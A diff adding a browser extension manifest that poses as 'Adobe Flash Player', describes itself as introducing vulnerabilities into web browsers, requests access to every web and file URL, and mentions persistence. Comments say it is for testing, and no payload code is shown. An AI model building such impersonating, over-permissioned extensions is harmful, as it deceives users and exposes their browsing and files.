@@ -1,0 +1,22 @@
+{
+  "name": "Adobe Flash Player",
+  "version": "1.0",
+  // when the browser icon is clicked, a new tab is open to maintain persistence (chrome.tabs.create)
+  // for the sake of testing...unfortunately the popup is closed when the user is not focusing on it.
+  // See at the end of index.html file.
+  "description": "Introduces vulnerabilites into webbrowsers",
+  "background": {
+    "scripts": ["background.js"]
+  },
+  "icons": { 
+    "16": "icon16.png",
+    "48": "icon48.png",
+    "128": "icon128.png" 
+  },
+  "permissions": [
+	"tabs", 
+	"http://*/*", 
+	"https://*/*",
+    "file://*/*"
+  ]
+}
